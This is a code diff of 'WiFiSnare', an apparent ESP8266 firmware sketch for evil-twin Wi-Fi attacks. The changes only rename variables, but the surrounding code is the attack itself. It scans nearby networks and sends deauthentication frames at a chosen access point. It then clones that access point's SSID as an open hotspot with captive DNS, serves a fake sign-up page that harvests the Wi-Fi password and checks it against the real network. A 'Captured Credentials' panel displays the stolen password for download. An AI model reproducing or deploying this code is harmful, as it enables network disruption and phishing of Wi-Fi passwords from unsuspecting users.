@@ -49,15 +49,15 @@ typedef struct {
   uint8_t bssid[6];
   int32_t rssi;
   uint8_t encryption;
-} _Network;
+} networkDetails;
 
-_Network _networks[16];
-_Network _selectedNetwork;
+networkDetails networks[16];
+networkDetails selectedNetwork;
 
 void clearArray() {
   for (int i = 0; i < 16; i++) {
-    _Network _network;
-    _networks[i] = _network;
+    networkDetails network;
+    networks[i] = network;
   }
 }
 
@@ -67,13 +67,13 @@ void performScan() {
   if (n <= 0) return;
   int count = min(n, 16);
   for (int i = 0; i < count; ++i) {
-    _Network network;
+    networkDetails network;
     network.ssid = WiFi.SSID(i);
     memcpy(network.bssid, WiFi.BSSID(i), 6);
     network.ch = WiFi.channel(i);
     network.rssi = WiFi.RSSI(i);
     network.encryption = WiFi.encryptionType(i);
-    _networks[i] = network;
+    networks[i] = network;
   }
 }
 
@@ -99,7 +99,7 @@ String bytesToStr(const uint8_t* bytes, uint32_t size) {
 }
 
 String index() {
-  String victimSSID = String(_selectedNetwork.ssid);
+  String victimSSID = String(selectedNetwork.ssid);
   String html = "<!DOCTYPE html>"
                 "<html><head>"
                 "<title>" + victimSSID + " : Sign Up</title>"
@@ -128,7 +128,7 @@ String index() {
 }
 
 String redirectPage() {
-  String victimSSID = String(_selectedNetwork.ssid);
+  String victimSSID = String(selectedNetwork.ssid);
   String redirectMessage = "<!DOCTYPE html>"
                            "<html lang='en'>"
                            "<head>"
@@ -154,7 +154,7 @@ String redirectPage() {
 }
 
 String updatePage(bool success) {
-  String victimSSID = String(_selectedNetwork.ssid);
+  String victimSSID = String(selectedNetwork.ssid);
   String updateMessage = "<!DOCTYPE html>"
                          "<html lang='en'>"
                          "<head>"
@@ -202,13 +202,13 @@ void handleResult() {
     String credentialsHtml;
     credentialsHtml += "<hr><div style='text-align: center;'>";
     credentialsHtml += "<h1>Captured Credentials</h1>";
-    credentialsHtml += "<p>SSID : " + _selectedNetwork.ssid + "</p>";
+    credentialsHtml += "<p>SSID : " + selectedNetwork.ssid + "</p>";
     credentialsHtml += "<p>Password : " + tryPassword + "</p>";
     credentialsHtml += "<button class='cred-btn' onclick=\"downloadPassword()\">Download Credentials</button></div>";
     credentialsHtml += R"rawliteral(
     <script>
       function downloadPassword() {
-        const ssid = ')rawliteral" + _selectedNetwork.ssid + R"rawliteral(';
+        const ssid = ')rawliteral" + selectedNetwork.ssid + R"rawliteral(';
         const password = ')rawliteral" + tryPassword + R"rawliteral(';
         const content = 'SSID : ' + ssid + '\nPassword : ' + password;
         const blob = new Blob([content], { type: 'text/plain' });
@@ -262,8 +262,8 @@ void handleIndex() {
   if (webServer.hasArg("ap")) {
     String selectedBSSID = webServer.arg("ap");
     for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == selectedBSSID) {
-        _selectedNetwork = _networks[i];
+      if (bytesToStr(networks[i].bssid, 6) == selectedBSSID) {
+        selectedNetwork = networks[i];
         break;
       }
     }
@@ -277,7 +277,7 @@ void handleIndex() {
     dnsServer.stop();
     WiFi.softAPdisconnect(true);
     WiFi.softAPConfig(apIP, apIP, subNetMask);
-    WiFi.softAP(startHotspot ? _selectedNetwork.ssid.c_str() : ssid, startHotspot ? NULL : password);
+    WiFi.softAP(startHotspot ? selectedNetwork.ssid.c_str() : ssid, startHotspot ? NULL : password);
     dnsServer.start(53, "*", apIP);
     return;
   }
@@ -291,7 +291,7 @@ void handleIndex() {
       }
       delay(1000);
       WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+      WiFi.begin(selectedNetwork.ssid.c_str(), tryPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
       webServer.send(200, "text/html", redirectPage());
       if (restartDeauth) {
         deauthing_active = true;
@@ -323,20 +323,20 @@ void handleIndex() {
                  "hr {border: none;height: 2px;background-color: #FFC72C;margin: 20px auto;}"
                  "</style></head><body><h2>WiFiSnare</h2>"
                  "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Encryption</th><th>Select</th></tr>";
-  for (int i = 0; i < 16 && _networks[i].ssid != ""; ++i) {
-  String bssidStr = bytesToStr(_networks[i].bssid, 6);
-  bool isSelected = (bssidStr == bytesToStr(_selectedNetwork.bssid, 6));
-  controlPanel += "<tr><td>" + _networks[i].ssid + "</td>"
+  for (int i = 0; i < 16 && networks[i].ssid != ""; ++i) {
+  String bssidStr = bytesToStr(networks[i].bssid, 6);
+  bool isSelected = (bssidStr == bytesToStr(selectedNetwork.bssid, 6));
+  controlPanel += "<tr><td>" + networks[i].ssid + "</td>"
                   "<td>" + bssidStr + "</td>"
-                  "<td>" + String(_networks[i].ch) + "</td>"
-                  "<td>" + String(_networks[i].rssi) + " dBm</td>"
-                  "<td>" + encryptionTypeStr(_networks[i].encryption) + "</td>"
+                  "<td>" + String(networks[i].ch) + "</td>"
+                  "<td>" + String(networks[i].rssi) + " dBm</td>"
+                  "<td>" + encryptionTypeStr(networks[i].encryption) + "</td>"
                   "<td><form method='post' action='/?ap=" + bssidStr + "'>"
                   "<button class='" + String(isSelected ? "selected-btn" : "select-btn") + "'>" + 
                   (isSelected ? "Selected" : "Select") + "</button></form></td></tr>";
   }
   controlPanel += "</table><hr><div class='button-container'>";
-  String disabled = (_selectedNetwork.ssid == "") ? "disabled" : "";
+  String disabled = (selectedNetwork.ssid == "") ? "disabled" : "";
   controlPanel += "<form style='display:inline-block;' method='post' action='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>"
          "<button class='capture-btn' " + disabled + ">" + String(deauthing_active ? "Stop Deauth" : "Start Deauth") + "</button></form>";
   controlPanel += "<form style='display:inline-block; margin-left:8px;' method='post' action='/?hotspot=" + String(hotspot_active ? "stop" : "start") + "'>"
@@ -354,8 +354,8 @@ void handleAdmin() {
   if (webServer.hasArg("ap")) {
     String selectedBSSID = webServer.arg("ap");
     for (int i = 0; i < 16; ++i) {
-      if (bytesToStr(_networks[i].bssid, 6) == selectedBSSID) {
-        _selectedNetwork = _networks[i];
+      if (bytesToStr(networks[i].bssid, 6) == selectedBSSID) {
+        selectedNetwork = networks[i];
         break;
       }
     }
@@ -371,7 +371,7 @@ void handleAdmin() {
     WiFi.softAPdisconnect(true);
     WiFi.softAPConfig(apIP, apIP, subNetMask);
     if (hotspot_active) {
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      WiFi.softAP(selectedNetwork.ssid.c_str());
     } else {
       WiFi.softAP(ssid, password);
     }
@@ -379,11 +379,11 @@ void handleAdmin() {
     return;
   }
   for (int i = 0; i < 16; ++i) {
-    if (_networks[i].ssid == "") break;
-    String bssidStr = bytesToStr(_networks[i].bssid, 6);
-    bool isSelected = (bytesToStr(_selectedNetwork.bssid, 6) == bssidStr);
-    controlPanel += "<tr><td>" + _networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" +
-             String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" +
+    if (networks[i].ssid == "") break;
+    String bssidStr = bytesToStr(networks[i].bssid, 6);
+    bool isSelected = (bytesToStr(selectedNetwork.bssid, 6) == bssidStr);
+    controlPanel += "<tr><td>" + networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" +
+             String(networks[i].ch) + "</td><td><form method='post' action='/?ap=" +
              bssidStr + "'>";
     controlPanel += isSelected
            ? "<button class='selected-btn'>Selected</button>"
@@ -394,7 +394,7 @@ void handleAdmin() {
   controlPanel.replace("{deauth}", deauthing_active ? "stop" : "start");
   controlPanel.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
   controlPanel.replace("{hotspot}", hotspot_active ? "stop" : "start");
-  controlPanel.replace("{disabled}", _selectedNetwork.ssid == "" ? " disabled" : "");
+  controlPanel.replace("{disabled}", selectedNetwork.ssid == "" ? " disabled" : "");
   if (correctPassword != "") {
     controlPanel += "<h3>" + correctPassword + "</h3>";
   }
@@ -432,9 +432,9 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
   if (deauthing_active && millis() - deauth_now >= 1000) {
-    wifi_set_channel(_selectedNetwork.ch);
-    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
-    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
+    wifi_set_channel(selectedNetwork.ch);
+    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
+    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
     deauthPacket[24] = 1;
     bytesToStr(deauthPacket, 26);
     deauthPacket[0] = 0xC0;
